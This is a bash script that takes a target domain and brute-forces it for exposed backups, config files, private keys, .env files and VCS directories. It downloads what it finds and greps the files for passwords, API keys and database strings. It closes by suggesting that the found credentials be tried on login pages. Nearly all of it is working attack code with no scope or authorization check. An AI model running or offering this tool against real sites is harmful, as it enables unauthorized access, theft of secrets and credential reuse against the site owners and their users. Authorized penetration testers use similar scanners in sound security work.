#!/bin/bash
# 🗂️ Elite Backup File Discovery & Sensitive Data Extraction
# Advanced techniques for finding backup files and sensitive data

echo "🗂️ Elite Backup File Discovery Started"

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./backup_file_discovery.sh target.com"
    exit 1
fi

mkdir -p backup_discovery_results
cd backup_discovery_results

echo "🎯 Starting backup file discovery for $TARGET"

# ===== PHASE 1: CUSTOM WORDLISTS CREATION =====
echo "📝 Phase 1: Creating custom wordlists..."

# Backup file extensions
cat > backup_extensions.txt << 'EOF'
.bak
.backup
.old
.orig
.tmp
.temp
.save
.copy
.sql
.dump
.tar
.tar.gz
.zip
.rar
.7z
.gz
.bz2
.xz
.tgz
.tbz2
.backup.sql
.sql.bak
.db.bak
.database.sql
.dump.sql
.backup.tar.gz
.old.tar.gz
.orig.zip
EOF

# Common backup filenames
cat > backup_filenames.txt << 'EOF'
backup
backup.sql
backup.tar.gz
backup.zip
database.sql
dump.sql
db_backup.sql
site_backup.tar.gz
website_backup.zip
config.bak
config.old
config.backup
settings.bak
.env.backup
.env.old
wp-config.php.bak
database_backup.sql
full_backup.tar.gz
site_dump.sql
mysql_backup.sql
postgres_backup.sql
mongodb_backup.json
redis_backup.rdb
backup_$(date +%Y%m%d).sql
backup_$(date +%Y-%m-%d).tar.gz
EOF

# Sensitive files to look for
cat > sensitive_files.txt << 'EOF'
.env
.env.local
.env.production
.env.development
.env.staging
config.php
config.inc.php
configuration.php
settings.php
database.php
db_config.php
wp-config.php
config.json
config.xml
config.yml
config.yaml
settings.json
settings.xml
app.config
web.config
application.properties
database.properties
hibernate.cfg.xml
persistence.xml
context.xml
server.xml
tomcat-users.xml
.htpasswd
.htaccess
.git/config
.svn/entries
.bzr/branch/branch.conf
.hg/hgrc
id_rsa
id_dsa
id_ecdsa
id_ed25519
private.key
server.key
certificate.crt
ssl.crt
ca.crt
keystore.jks
truststore.jks
wallet.dat
seed.txt
mnemonic.txt
private_key.pem
EOF

# Directory names to check
cat > backup_directories.txt << 'EOF'
backup
backups
bak
old
tmp
temp
archive
archives
dump
dumps
export
exports
data
database
db
sql
files
uploads
assets
media
logs
log
cache
sessions
config
configuration
settings
admin
administrator
test
testing
dev
development
staging
prod
production
www
public_html
htdocs
webroot
EOF

# ===== PHASE 2: AUTOMATED DISCOVERY =====
echo "🔍 Phase 2: Automated backup file discovery..."

# Function to test URLs
test_backup_files() {
    local base_url=$1
    local wordlist=$2
    local extension=${3:-""}
    
    echo "Testing with wordlist: $wordlist"
    
    while read -r word; do
        if [ -n "$extension" ]; then
            test_url="${base_url}/${word}${extension}"
        else
            test_url="${base_url}/${word}"
        fi
        
        # Test with different HTTP methods
        for method in GET HEAD; do
            response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -X $method "$test_url" --max-time 10)
            status_code=$(echo $response | cut -d: -f1)
            size=$(echo $response | cut -d: -f2)
            
            if [ "$status_code" = "200" ] && [ "$size" -gt "0" ]; then
                echo "✅ FOUND: $test_url (Size: $size bytes)" | tee -a found_backups.txt
                
                # Download small files for analysis
                if [ "$size" -lt "10485760" ]; then  # Less than 10MB
                    echo "📥 Downloading: $test_url"
                    curl -s "$test_url" -o "downloaded_$(basename $test_url)" --max-time 30
                fi
            elif [ "$status_code" = "403" ]; then
                echo "🚫 FORBIDDEN: $test_url" | tee -a forbidden_files.txt
            fi
        done
        
        sleep 0.1  # Rate limiting
    done < "$wordlist"
}

# Test backup files with extensions
echo "🔍 Testing backup files with extensions..."
for ext in $(cat backup_extensions.txt); do
    echo "Testing extension: $ext"
    test_backup_files "https://$TARGET" "backup_filenames.txt" "$ext"
done

# Test sensitive files
echo "🔍 Testing sensitive files..."
test_backup_files "https://$TARGET" "sensitive_files.txt"

# Test backup directories
echo "🔍 Testing backup directories..."
while read -r dir; do
    echo "Testing directory: $dir"
    dir_url="https://$TARGET/$dir/"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "$dir_url" --max-time 10)
    if [ "$response" = "200" ] || [ "$response" = "403" ]; then
        echo "✅ DIRECTORY FOUND: $dir_url" | tee -a found_directories.txt
        
        # Test files in found directories
        test_backup_files "https://$TARGET/$dir" "backup_filenames.txt"
        test_backup_files "https://$TARGET/$dir" "sensitive_files.txt"
    fi
    
    sleep 0.1
done < backup_directories.txt

# ===== PHASE 3: ADVANCED TECHNIQUES =====
echo "🚀 Phase 3: Advanced discovery techniques..."

# Test with common CMS paths
cat > cms_backup_paths.txt << 'EOF'
/wp-content/backup-db/
/wp-content/backups/
/wp-admin/backup/
/administrator/backups/
/admin/backup/
/backup/
/backups/
/old/
/tmp/
/temp/
/cache/
/logs/
/log/
/data/
/database/
/db/
/sql/
/dump/
/export/
/archive/
EOF

echo "🔍 Testing CMS backup paths..."
while read -r path; do
    test_url="https://$TARGET$path"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url" --max-time 10)
    
    if [ "$response" = "200" ] || [ "$response" = "403" ]; then
        echo "✅ CMS PATH FOUND: $test_url" | tee -a found_cms_paths.txt
    fi
    
    sleep 0.1
done < cms_backup_paths.txt

# Test with date-based backup names
echo "🗓️ Testing date-based backup names..."
current_year=$(date +%Y)
current_month=$(date +%m)
current_day=$(date +%d)

for year in $current_year $((current_year-1)) $((current_year-2)); do
    for month in $(seq -w 1 12); do
        for day in $(seq -w 1 31); do
            # Test various date formats
            date_formats=(
                "backup_${year}${month}${day}.sql"
                "backup_${year}-${month}-${day}.sql"
                "backup_${year}_${month}_${day}.tar.gz"
                "db_backup_${year}${month}${day}.sql"
                "site_backup_${year}-${month}-${day}.zip"
            )
            
            for format in "${date_formats[@]}"; do
                test_url="https://$TARGET/$format"
                response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$test_url" --max-time 5)
                status_code=$(echo $response | cut -d: -f1)
                size=$(echo $response | cut -d: -f2)
                
                if [ "$status_code" = "200" ] && [ "$size" -gt "0" ]; then
                    echo "✅ DATE-BASED BACKUP FOUND: $test_url (Size: $size bytes)" | tee -a found_date_backups.txt
                fi
            done
            
            # Only test recent dates to avoid too many requests
            if [ "$year" = "$current_year" ] && [ "$month" = "$current_month" ]; then
                if [ "$day" -gt "$((current_day + 7))" ]; then
                    break
                fi
            fi
        done
    done
done

# ===== PHASE 4: CONTENT ANALYSIS =====
echo "🔬 Phase 4: Analyzing downloaded files..."

if [ -d "." ] && [ "$(ls downloaded_* 2>/dev/null | wc -l)" -gt 0 ]; then
    echo "📊 Analyzing downloaded backup files..."
    
    for file in downloaded_*; do
        if [ -f "$file" ]; then
            echo "🔍 Analyzing: $file"
            
            # Check file type
            file_type=$(file "$file")
            echo "File type: $file_type"
            
            # Extract sensitive information
            echo "🔑 Searching for sensitive data in $file..."
            
            # Database credentials
            grep -i "password\|passwd\|pwd\|secret\|key\|token" "$file" | head -10 | tee -a sensitive_data.txt
            
            # API keys
            grep -E "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24}|AIza[0-9A-Za-z\\-_]{35})" "$file" | tee -a api_keys.txt
            
            # Email addresses
            grep -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$file" | head -10 | tee -a email_addresses.txt
            
            # URLs
            grep -E "https?://[^\s]+" "$file" | head -10 | tee -a found_urls.txt
            
            # Database connection strings
            grep -i "mysql\|postgresql\|mongodb\|redis\|sqlite" "$file" | head -5 | tee -a db_connections.txt
        fi
    done
else
    echo "ℹ️ No files downloaded for analysis"
fi

# ===== PHASE 5: REPORTING =====
echo "📋 Phase 5: Generating report..."

cat > backup_discovery_report.md << EOF
# Backup File Discovery Report for $TARGET
Generated: $(date)

## Summary
- Found backup files: $(wc -l < found_backups.txt 2>/dev/null || echo "0")
- Found directories: $(wc -l < found_directories.txt 2>/dev/null || echo "0")
- Forbidden files: $(wc -l < forbidden_files.txt 2>/dev/null || echo "0")
- Downloaded files: $(ls downloaded_* 2>/dev/null | wc -l)

## Discovered Backup Files
EOF

if [ -f "found_backups.txt" ]; then
    cat found_backups.txt >> backup_discovery_report.md
fi

cat >> backup_discovery_report.md << EOF

## Discovered Directories
EOF

if [ -f "found_directories.txt" ]; then
    cat found_directories.txt >> backup_discovery_report.md
fi

cat >> backup_discovery_report.md << EOF

## Sensitive Data Found
EOF

if [ -f "sensitive_data.txt" ]; then
    echo "### Database Credentials and Secrets" >> backup_discovery_report.md
    cat sensitive_data.txt >> backup_discovery_report.md
fi

if [ -f "api_keys.txt" ]; then
    echo "### API Keys" >> backup_discovery_report.md
    cat api_keys.txt >> backup_discovery_report.md
fi

echo "✅ Backup file discovery completed!"
echo "📁 Results saved in: backup_discovery_results/"
echo "📋 Report: backup_discovery_report.md"
echo ""
echo "🎯 Next steps:"
echo "1. Review found_backups.txt for discovered files"
echo "2. Check sensitive_data.txt for credentials"
echo "3. Analyze downloaded files manually"
echo "4. Test found credentials on login pages"
